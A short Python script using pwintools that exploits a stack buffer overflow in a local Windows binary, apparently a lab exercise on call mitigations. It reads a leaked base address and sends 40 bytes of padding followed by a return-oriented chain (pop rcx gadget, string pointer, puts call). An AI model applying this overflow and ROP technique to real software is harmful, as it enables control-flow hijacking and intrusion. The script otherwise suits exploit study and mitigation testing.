
from pwintools import *

retAddrOffs = 40

p = Process('1_direct_calls_vs_64.exe')

p.set_timeout(3600000)

p.recvuntil(b'ss is ')
input = p.recvuntil(b'\r\n')

base = int(input[:16], 16)

print('base is ', hex(base))

POP_RCX = base + 0x16226 # pop rcx; cld; ret;
PUTS_IN_MAIN = base + 0x142B1
DUMMY_STRING = base + 0x80D00

p.recvuntil(b'ciao\r\n')
p.sendline(
	b'a' * retAddrOffs
	+ p64(POP_RCX)
	+ p64(DUMMY_STRING)
	+ p64(PUTS_IN_MAIN)
)

p.interactive()

